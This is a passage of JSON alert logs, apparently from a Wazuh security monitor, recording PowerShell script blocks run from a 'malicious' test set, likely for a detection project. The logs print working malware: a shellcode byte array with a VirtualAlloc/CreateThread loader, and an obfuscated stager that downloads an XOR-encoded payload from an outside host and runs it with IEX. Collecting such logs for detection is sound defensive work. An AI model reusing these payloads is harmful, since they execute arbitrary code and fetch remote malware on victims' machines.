0xba,0x4e,0xa7,0xbf,0x9d,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x41,0x45,0x4a,0x61,0xb5,0x0b,0xb5,0x9a,0x45,0x6c,0x3f,0x7f,0x74,0xac,0x5b,0x0b,0x26,0x1c,0x2f,0x59,0xca,0xd7,0x7d,0x4a,0x59,0x95,0xa9,0x7d,0xea,0x10,0x8c,0xb0,0xeb,0x09,0xec,0xd3,0x6f,0x50,0x21,0x34,0x4e,0x9b,0x34,0x35,0x97,0xc6,0xb5,0x67,0x40,0x8c,0x68,0x98,0xe5,0xd8,0xb0,0x13,0xb5,0xcd,0xb0,0xc0,0x0d,0xef,0x91,0x56,0x06,0xb6,0x31,0x58,0xcb,0xc2,0x7b,0x42,0x08,0xee,0x32,0xf9,0xfa,0x84,0xc4,0x2b,0x33,0x64,0x6a,0x12,0xfc,0x97,0x72,0x52,0x3a,0x48,0x01,0xaa,0x39,0xf5,0x12,0x69,0x40,0x21,0x96,0x6a,0xe2,0xa2,0x00,0x57,0x13,0x66,0xd6,0x1c,0x1f,0xc3,0x9c,0x7b,0x03,0xd2,0x71,0xf0,0x3f,0x5f,0x74,0xd7,0xb6,0x1b,0x53,0xf3,0x93,0xf8,0xfa,0xa2,0x79,0xae,0x03,0xb4,0x22,0x0f,0xa6,0xbe,0xce,0x44,0xdb,0x9c,0x86,0xa9,0xd6,0x1e,0x56,0xa6,0x61,0x6c,0x64,0x69,0xda,0xfa,0xc4,0xe2,0xc4,0xfd,0x2b,0xd9,0xb1,0x92,0xd2,0xe2,0xc1,0xbb,0x10,0xb6,0x91,0xd3,0xb1,0xb7,0x79,0x24,0x3e,0x62,0x17,0x21,0xa8,0x4d,0x40,0x28,0x43,0x26,0x93,0x2b,0x92,0x0a,0x1a,0xcd,0xc4,0x22,0x4d,0x42,0xa4,0x92,0x2d,0x32,0x4c,0xf9,0xa1,0x6d,0x6c,0x02,0x68,0x06,0x06,0xed,0xc5,0x7e,0xbe,0x94,0x4f,0xf4,0x5f,0x58,0x5a,0x70,0x5f,0xd2,0x69,0x84,0x11,0x13,0x07,0x96,0xc5,0xd3,0x52,0xc4,0x43,0xeb,0x48,0x63,0x6b,0x79,0x77,0x22,0x3c,0x15,0x75,0x13,0x0a,0xba,0x86,0x76,0x01,0x73,0x13,0x39,0x7d,0x7c,0xf3,0xb9,0x7d,0x2a,0x99,0xb9,0x15,0x8a,0xf9,0xe9,0x00,0xd5,0xd7,0x9d,0x99,0x40,0xd8,0xf7,0x4e,0xc2,0xb0,0xf5,0xa9,0x24,0x1f,0x05,0x9c,0xb4,0x63,0xd0,0xd8,0xc2,0x8d,0xe0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$3uZS=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($3uZS.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$3uZS,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"425d89b2-44ad-4195-b2e5-321b038cbcc0","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3559.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:25.477+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":20,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304485.3853577","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:45.3095780Z","eventRecordID":"145697","processID":"4112","threadID":"8276","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n[SYStEm.NeT.SerVICePoiNTMANAGER]::EXPECT100CONtiNUe = 0;$WC=NeW-OBJecT SySTEM.NeT.WebCLiENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEADErS.ADD('User-Agent',$u);$WC.PRoxy = [SySTeM.Net.WeBRequESt]::DEfaultWEBPRoxy;$Wc.PROxY.CReDeNtIAls = [SYstem.NET.CredENTiALCacHE]::DeFaultNetWorkCREdentiAlS;$K='VjGe9c_oMP*~Y{`6CEqIOrX}|UF:y!7D';$I=0;[char[]]$b=([cHAr[]]($wC.DownLoADSTrInG(\"http://amazonsdeliveries.com/index.asp\")))|%{$_-BXor$K[$i++%$k.LEnGTH]};IEX ($B-JOIN'')\r\n\r\nScriptBlock ID: 2ebe1a1f-efe6-4a36-a0fb-c48c09bfeecf\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\358.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"[SYStEm.NeT.SerVICePoiNTMANAGER]::EXPECT100CONtiNUe = 0;$WC=NeW-OBJecT SySTEM.NeT.WebCLiENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEADErS.ADD('User-Agent',$u);$WC.PRoxy = [SySTeM.Net.WeBRequESt]::DEfaultWEBPRoxy;$Wc.PROxY.CReDeNtIAls = [SYstem.NET.CredENTiALCacHE]::DeFaultNetWorkCREdentiAlS;$K='VjGe9c_oMP*~Y{`6CEqIOrX}|UF:y!7D';$I=0;[char[]]$b=([cHAr[]]($wC.DownLoADSTrInG(\\\"http://amazonsdeliveries.com/index.asp\\\")))|%{$_-BXor$K[$i++%$k.LEnGTH]};IEX ($B-JOIN'')","scriptBlockId":"2ebe1a1f-efe6-4a36-a0fb-c48c09bfeecf","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\358.ps1"}}},"location":"EventChannel"}
